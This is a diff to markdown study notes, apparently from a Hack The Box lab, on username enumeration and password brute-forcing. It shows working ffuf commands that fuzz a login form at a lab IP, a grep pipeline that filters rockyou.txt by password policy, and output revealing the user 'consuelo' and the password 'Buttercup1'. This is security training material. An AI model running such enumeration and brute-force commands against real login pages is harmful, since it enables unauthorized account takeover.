@@ -33,8 +33,6 @@ On the other hand, when we attempt to log in with a registered user such as `ht
 
 Let us exploit this difference in error messages returned and use SecLists's wordlist `xato-net-10-million-usernames.txt` to enumerate valid users with `ffuf`. We can specify the wordlist with the `-w` parameter, the POST data with the `-d` parameter, and the keyword `FUZZ` in the username to fuzz valid users. Finally, we can filter out invalid users by removing responses containing the string `Unknown user`:
 
-  Enumerating Users
-
 ```shell-session
 ShibuShivansh@htb[/htb]$ ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
 
@@ -43,3 +41,34 @@ ShibuShivansh@htb[/htb]$ ffuf -w /opt/useful/seclists/Usernames/xato-net-10-mill
 [Status: 200, Size: 3271, Words: 754, Lines: 103, Duration: 310ms]
     * FUZZ: consuelo
 ```
+
+
+## Brute-forcing Passwords
+**Counting Number of Lines in Wordlists :**
+```shell-session
+ShibuShivansh@htb[/htb]$ wc -l /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
+
+14344391 /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
+```
+
+**Matching Passwords according to the Password Policy:**
+```shell-session
+ShibuShivansh@htb[/htb]$ grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
+
+ShibuShivansh@htb[/htb]$ wc -l custom_wordlist.txt
+
+151647 custom_wordlist.txt
+```
+
+
+Upon providing an incorrect username, the login response contains the message (substring) "Invalid username", therefore, we can use this information to build our `ffuf` command to brute-force the user's password:
+
+```shell-session
+ShibuShivansh@htb[/htb]$ ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
+
+<SNIP>
+
+[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 4764ms]
+    * FUZZ: Buttercup1
+```
+
